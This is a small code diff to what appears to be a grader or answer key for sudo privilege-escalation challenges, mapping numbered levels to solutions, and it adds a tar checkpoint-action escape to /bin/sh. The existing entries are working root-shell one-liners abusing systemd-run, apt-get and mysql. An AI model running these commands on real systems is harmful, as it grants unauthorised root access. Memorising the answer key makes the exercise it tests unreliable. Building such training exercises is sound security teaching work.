@@ -99,6 +99,7 @@ const SOLUTIONS = {
     29: ['sudo systemd-run /bin/sh'],
     30: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'],
     31: ["sudo mysql -e '\\! /bin/sh'"],
+    32: ['sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'],
 };
 
 let pass = 0, fail = 0;
